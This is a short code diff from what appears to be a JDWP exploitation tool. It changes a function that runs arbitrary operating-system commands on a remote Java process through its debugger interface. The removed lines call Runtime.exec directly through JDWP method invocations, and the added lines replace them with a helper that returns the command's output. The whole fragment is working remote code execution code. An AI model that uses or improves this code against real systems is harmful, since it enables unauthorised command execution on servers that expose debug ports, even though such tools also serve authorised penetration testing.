@@ -721,24 +721,12 @@ def do_cmd(jdwp, tId, command):
     print(" EXEC  [%s]" % command)
     print("="*70 + "\n")
 
-    rtCls = jdwp.get_class("Ljava/lang/Runtime;")
-    if not rtCls: return print("[-] Runtime not found")
-    rid = rtCls["refTypeId"]
-    jdwp.get_methods(rid)
-
-    getRtMeth = jdwp.find_method(rid, "getRuntime")
-    if not getRtMeth: return print("[-] getRuntime() not found")
-
-    buf = jdwp.invokestatic(rid, tId, getRtMeth["methodId"])
-    rtObj, _, _ = jdwp.read_tagged_value(buf, 0)
-
-    execMeth = jdwp.find_method(rid, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
-    if not execMeth: return print("[-] exec(String) not found")
-
-    cmdArg, _ = jdwp.make_string_arg(command)
-    buf = jdwp.invoke(rtObj, tId, rid, execMeth["methodId"], cmdArg)
-    procId, _, tag = jdwp.read_tagged_value(buf, 0)
-    print("[+] exec() returned Process id:%#x (fire-and-forget)" % procId)
+    output = jdwp.exec_with_output(tId, command)
+    if output:
+        print(output)
+    else:
+        print("[-] Empty output (command returned nothing or failed)")
+    return output
 
 
 ################################################################################
